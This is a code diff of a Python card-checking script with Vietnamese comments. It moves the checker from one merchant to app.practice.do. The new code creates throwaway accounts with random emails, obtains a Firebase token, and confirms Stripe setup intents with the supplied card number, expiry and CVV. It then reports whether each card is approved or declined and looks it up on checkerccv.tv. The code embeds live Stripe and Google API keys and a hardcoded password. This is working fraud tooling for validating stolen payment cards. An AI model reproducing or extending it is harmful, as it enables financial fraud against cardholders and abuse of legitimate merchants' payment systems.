@@ -16,48 +16,68 @@ HEADERS = {
     "cookie": COOKIES
 }
 
-
-# ========== NHÓM TRẠNG THÁI HIỂN THỊ ========== #
-STATUS_LABELS = {
-    "Success": "✅ Approved",
-    "Failure": "❌ Declined",
-    "Funds": "💸 Insufficient Funds",
-    "CCN": "⚠️ Incorrect CVC",
-    "Custom": "⚠️ 3DS / Action Required",
-    "Unknown": "❓ Unknown",
-}
-
-
 # ========== HÀM XỬ LÝ THẺ ========== #
 async def process_card(cc, mes, ano, cvv, user_id=None):
-    bin_code = cc[:6]
+    import random, string
+
+    def random_email():
+        prefix = ''.join(random.choices(string.ascii_lowercase, k=18))
+        return f"{prefix}62@gmail.com"
+
     start_time = time.time()
     try:
-        r1 = requests.get("https://urbanflixtv.com/account/purchases/payment_methods", headers=HEADERS)
-        soup = BeautifulSoup(r1.text, "html.parser")
-        token_tag = soup.find("meta", {"name": "csrf-token"})
-        if not token_tag:
-            return "❌ Không lấy được CSRF token."
+        email = random_email()
+        payload1 = {
+            "email": email,
+            "isCoach": True,
+            "password": "Minhnhat##123",
+            "firstName": "Nhat",
+            "lastName": "Minh"
+        }
+        headers_json = {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+            "Pragma": "no-cache",
+            "Accept": "*/*"
+        }
 
-        # Retry tối đa 5 lần nếu lỗi setup_intent
-        setid = ""
-        for attempt in range(5):
-            r2 = requests.get("https://urbanflixtv.com/api/billings/setup_intent?page=payment_methods&currency=usd", headers=HEADERS)
-            if r2.status_code == 200:
-                try:
-                    setid = r2.json().get("setup_intent", "")
-                    if setid:
-                        break
-                except Exception:
-                    pass
-            time.sleep(1)
-        if not setid:
-            return "❌ Lỗi lấy setup_intent (sau 5 lần thử)"
+        r1 = requests.post("https://app.practice.do/api/v1/users/create", json=payload1, headers=headers_json)
+        if "Email already in use" in r1.text:
+            return "❌ Email đã được sử dụng."
 
-        setin = setid.split("_secret_")[0]
+        r2 = requests.post(
+            "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyChZfnLzMeEIDjQ8XSw3y9sO7jp0O4lkIk",
+            json={
+                "returnSecureToken": True,
+                "email": email,
+                "password": "Minhnhat##123",
+                "clientType": "CLIENT_TYPE_WEB"
+            },
+            headers=headers_json
+        )
+        tk = r2.json().get("idToken")
+        if not tk:
+            return "❌ Không đăng nhập được (không lấy được token)."
 
-        payload = {
-            "return_url": "https://urbanflixtv.com/account/purchases/payment_methods/async_method_setup",
+        headers_token = {
+            "host": "app.practice.do",
+            "accept": "application/json, text/plain, */*",
+            "content-length": "0",
+            "origin": "https://app.practice.do",
+            "pragma": "no-cache",
+            "user-agent": headers_json["User-Agent"],
+            "cookie": f"firebase_token={tk}"
+        }
+        r3 = requests.post(
+            "https://app.practice.do/api/v1/users/zy9ODRErt6VR2i98vmtMUPNkL533/stripe/setup-intent",
+            headers=headers_token
+        )
+        src = r3.text
+        d = r3.json().get("clientSecret", "")
+        n = src.split("\"clientSecret\":\"")[1].split("_secret_")[0]
+
+        form_data = {
+            "return_url": f"https://app.practice.do/start-trial?step=2&email={email}&planInformation=%257B%2522name%2522%253A%2522Basic%2522%252C%2522priceId%2522%253A%2522price_1O9UHlDXXMkswpxpZ6L912U1%2522%252C%2522tier%2522%253A%2522basic%2522%252C%2522frequency%2522%253A%2522month%2522%252C%2522amount%2522%253A5%252C%2522currency%2522%253A%2522usd%2522%257D",
             "payment_method_data[type]": "card",
             "payment_method_data[card][number]": cc,
             "payment_method_data[card][cvc]": cvv,
@@ -65,16 +85,17 @@ async def process_card(cc, mes, ano, cvv, user_id=None):
             "payment_method_data[card][exp_month]": mes,
             "payment_method_data[billing_details][address][country]": "VN",
             "use_stripe_sdk": "true",
-            "key": "pk_live_DImPqz7QOOyx70XCA9DSifxb",
-            "_stripe_account": "acct_1Cmk2bLbC5cLZDVD",
-            "client_secret": setid
+            "key": "pk_live_8vuRcdG8hx5kBi7MTtoqIeCc00alpMFwtE",
+            "client_secret": d
         }
 
-        r3 = requests.post(f"https://api.stripe.com/v1/setup_intents/{setin}/confirm", headers=HEADERS, data=payload)
-        j3 = r3.json()
-        status = j3.get("status", "UNKNOWN")
-        decline = j3.get("error", {}).get("decline_code", "NONE")
+        r4 = requests.post(f"https://api.stripe.com/v1/setup_intents/{n}/confirm", data=form_data, headers=headers_json)
+        j4 = r4.json()
+        status = j4.get("status", "UNKNOWN")
+        decline = j4.get("error", {}).get("decline_code", "NONE")
 
+        # Check BIN
+        bin_code = cc[:6]
         bin_res = requests.get(f"https://new.checkerccv.tv/bin_lookup.php?bin={bin_code}")
         bin_json = bin_res.json()
         card = bin_json.get("scheme", "N/A")
@@ -91,7 +112,7 @@ async def process_card(cc, mes, ano, cvv, user_id=None):
 <b>Status:</b> {'✅ Approved' if status == 'succeeded' else '❌ Declined'}
 <b>Decline Code:</b> {decline}
 
-<b>Gateway:</b> Stripe
+<b>Gateway:</b>  → Stripe V6
 <b>Card:</b> {card.upper()}
 <b>Type:</b> {type_.capitalize()}
 <b>Brand:</b> {brand}
